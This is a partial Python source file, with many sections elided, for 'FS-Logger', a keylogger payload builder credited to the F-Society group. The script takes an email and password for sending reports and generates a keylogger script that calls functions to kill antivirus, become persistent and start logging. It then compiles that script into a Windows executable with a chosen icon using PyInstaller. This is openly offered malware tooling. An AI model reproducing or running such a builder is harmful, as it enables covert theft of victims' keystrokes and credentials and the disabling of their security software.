...
#==================================================================
#Author : Hritik Kumbhar(1ucif3r)
#Website: https://bit.ly/3dlLYnT
#==================================================================
#Github: https://github.com/F-Society-Official
#==================================================================
...
if platform.system() == 'Windows':
    ...
    WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python39/Scripts/pyinstaller.exe")
elif platform.system() == 'Linux':
    AttackerPlatform = 'Linux'
    WINDOWS_PYTHON_PYINSTALLER_PATH = "wine ~/.wine/drive_c/Python37-32/Scripts/pyinstaller.exe"

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}FS-Logger v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=180", default=180)
...
def check_dependencies():
    ...
    try:
        ...
        print(f"{RED}[!] Error : {e}")
        try:
            print(f"{YELLOW}[*] Installing All Dependencies...\n")
            print(f'\n{WHITE}[ * * * * * * * * * * * * * * * * * * * *  ]\n')
            import pip
            while 1:
...
def create_keylogger(file_name, interval, email, password, time_persistent):
    with open(file_name, "w+") as file:
        ...
        file.write(f"\t\tfslogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")        
        file.write("\t\tfslogger.kill_av()\n")        
        file.write(f"\t\tfslogger.become_persistent({time_persistent})\n")
        file.write("\t\tfslogger.start()\n\n")       
...
def exit_greet():
    try:
        ...
        os.system('clear')        
    print(GREEN + '''Thank You for using FS-Logger, ❤ from F-S0c13ty !  \n''' + END)
    quit()
...
if __name__ == '__main__':
    if platform.system() == 'Linux':     
        ...
        if not os.geteuid() == 0:
            sys.exit('fslogger must be run as root')         
    if platform.system() == 'Windows': 
    ...
    try:
        ...
        print(f"\t\t{YELLOW}Author: {GREEN}1ucif3r | {YELLOW}GitHub: {GREEN}@1ucif3r\n")

        arguments = get_arguments()       
        
        if arguments.icon == None:
            arguments.icon = input(f'{RED}[!] Please Specify the Icon Path {WHITE}[{GREEN}LEAVE BLANK to SET icon/exe.ico as icon{WHITE}] : ')
            if arguments.icon == "":
        ...
        if not os.path.exists(WINDOWS_PYTHON_PYINSTALLER_PATH.replace("wine ", "")) and arguments.windows:
            ...
            if WINDOWS_PYTHON_PYINSTALLER_PATH == "Unable-To-Find":
        ...
        print(f"\n{YELLOW}[*] Generating Payload Keep patience !...{MAGENTA}\n")
        ...
        if os.path.exists(f'dist/{arguments.out}.exe') or os.path.exists(f'dist/{arguments.out}') or os.path.exists(f'~/opt/fslogger/dist/{arguments.out}.exe') or os.path.exists(f'{os.getcwd()}\\dist\\{arguments.out}.exe'):
            ...
            print(f"\n{GREEN}[:D] Please Contact us on https://github.com/F-Society-Official/fslogger\n")                  
